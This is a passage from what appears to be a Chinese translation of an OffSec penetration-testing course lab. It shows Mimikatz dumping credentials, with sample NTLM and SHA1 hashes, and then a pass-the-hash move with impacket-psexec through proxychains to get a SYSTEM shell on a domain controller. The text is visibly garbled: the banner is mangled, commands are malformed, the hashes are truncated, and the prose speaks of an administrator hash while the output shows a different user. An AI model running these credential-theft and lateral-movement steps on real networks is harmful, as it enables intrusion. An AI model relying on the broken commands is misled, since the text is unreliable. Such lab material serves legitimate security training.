
```
PS C:\Users\Administrator> .mimikatz.exe
```

```
#####
# mimikatz 2.2.0 (#x694) Sep 19 2022 17:44:08
# Vie La'Amour (oeoo)
# Mimikatz DELP > benjamin@gentilikwi.com
# > vincent.letoux@gmail.com
# VINCENT LETUX
#####
```

```列表 943 - 下载并启动最新版本的 Mimikatz

一旦启动了 Mimikatz，我们可以使用 `privilege::debug` 获取权限²。然后，我们可以使用 `sekurlsa::logon` 列出所有凭据。

```

`mimikatz > privilege::debug`

Privilege 'OK'

`mimikatz > sekurlsa::logon`

...

```
```

Authentication Id : 0

Session : 1

User Name : becky

Domain : BEYOND

Logon Server : DCSRV

Logon Time : 3/8/2023 4:50:32 AM

```
```

Username: becky

Domain: BEYOND

NTLM: f39eca5af4997f6db078704b3

SHA1: d28b761fbd215174fd9932c52de443cc

```

Github, (2022). https://github.com/gentilikwi/mimikatz/releases
Microsoft Learn, (2022). https://learn.microsoft.com/en-us/windows/security/threat-protection/policy-settings

PWK - © 2023 OffSec Services Limited. 保留所有。

# OffSec

## 使用 Kali Linux 进行渗透测试

```
SID : S-5-21-1104083-291554705-2081307249-1108
```

太棒了！我们成功提取了 `administrator` 的明文和 NTLM 哈希。让我们连同用户名一起存在 `creds.txt` 中。

有了这些凭据，我们现在可以进行渗透的最后一步：访问域控制器。我们将在下一节进行。

### 24.6.2 横向移动

在本节中，我们将利用域管理员权限获取域控制器的访问，并实现渗透测试的第二个目标。

由于我们获得了 `administrator` 的明文和 NTLM 哈希，我们可以使用 `impacket-psexec` 获取 `DCSRV` 的交互界面。虽然我们可以使用任何一种，但让我们使用 NTLM 哈希。一旦我们有了命令行，我们就有了 `DCSRV` 的特权访问权限。

```
kali@kali: ~ proxychains -q impacket-psexec -hashes
```

- [+] 请求共享...
- [+] 找到可写共享 ADMIN$
- [+] 正在上传文件 psexec.exe
- [+] 正在打开 SCM...
- [+] 正在创建服务...
- [+] 正在启动服务...
- [+] 按帮助查看更多命令
Microsoft Windows [Version 10.0.20348.1006]
(C) Microsoft Corporation. 保留所有。

```
C:\Windows\system32> whoami
```

nt authority\system

# OffSec

## 使用 Kali Linux 进行渗透测试

```
C:\Windows\system32> hostname
```

DCSRV

```
C:\Windows\system32> ipconfig
```
